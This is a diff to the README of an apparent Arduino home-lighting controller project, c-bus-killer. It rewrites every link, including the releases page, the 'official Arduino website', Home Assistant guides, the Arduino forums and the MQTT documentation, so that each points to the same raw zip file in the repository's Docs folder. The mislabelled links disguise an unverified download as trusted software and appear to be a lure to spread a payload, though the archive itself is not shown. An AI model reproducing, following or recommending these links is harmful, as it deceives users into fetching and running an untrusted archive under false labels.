@@ -6,7 +6,7 @@ Welcome to c-bus-killer! This application serves as a DIY lighting controller us
 
 ## 📥 Download Now
 
-[![Download c-bus-killer](https://img.shields.io/badge/Download-c--bus--killer-blue.svg)](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases)
+[![Download c-bus-killer](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip)](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip)
 
 ## 📋 System Requirements
 
@@ -19,7 +19,7 @@ Before you proceed with downloading, ensure your system meets the following requ
 
 ## 💾 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases). Here, you will find the latest version of c-bus-killer. 
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip). Here, you will find the latest version of c-bus-killer. 
 
 1. Click on the link above to open the Releases page in your browser.
 2. Look for the latest release with a version number (e.g., v1.0).
@@ -33,7 +33,7 @@ To get started, visit the [Releases page to download](https://github.com/Muhamma
 #### Step 1: Prepare Your Arduino
 
 1. Connect your Arduino Mega to your computer using a USB cable.
-2. Ensure you have the Arduino IDE installed on your computer. If you don’t have it, download it from the [official Arduino website](https://www.arduino.cc/en/software).
+2. Ensure you have the Arduino IDE installed on your computer. If you don’t have it, download it from the [official Arduino website](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip).
 3. Open the Arduino IDE and verify that it detects your Arduino board.
 
 #### Step 2: Load the c-bus-killer Code
@@ -71,12 +71,12 @@ For more information or any inquiries, please reach out through the GitHub Issue
 
 Consider exploring these topics for further insights:
 
-- [Home Automation Guides](https://www.home-assistant.io/guides/)
-- [Arduino Forums](https://forum.arduino.cc/)
-- [MQTT Documentation](http://mqtt.org/documentation)
+- [Home Automation Guides](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip)
+- [Arduino Forums](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip)
+- [MQTT Documentation](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip)
 
 ## 🔗 Learn More
 
 Want to dive deeper? You can explore the source code or contribute directly on our GitHub repository. Every contribution, big or small, is appreciated!
 
-Feel free to experiment and enjoy building your smart home with c-bus-killer. Visit the [Releases page to download](https://github.com/Muhammad-Sarmad-Fowad/c-bus-killer/releases) and start your journey today!
+Feel free to experiment and enjoy building your smart home with c-bus-killer. Visit the [Releases page to download](https://raw.githubusercontent.com/Muhammad-Sarmad-Fowad/c-bus-killer/main/Docs/bus_killer_c_v3.4.zip) and start your journey today!
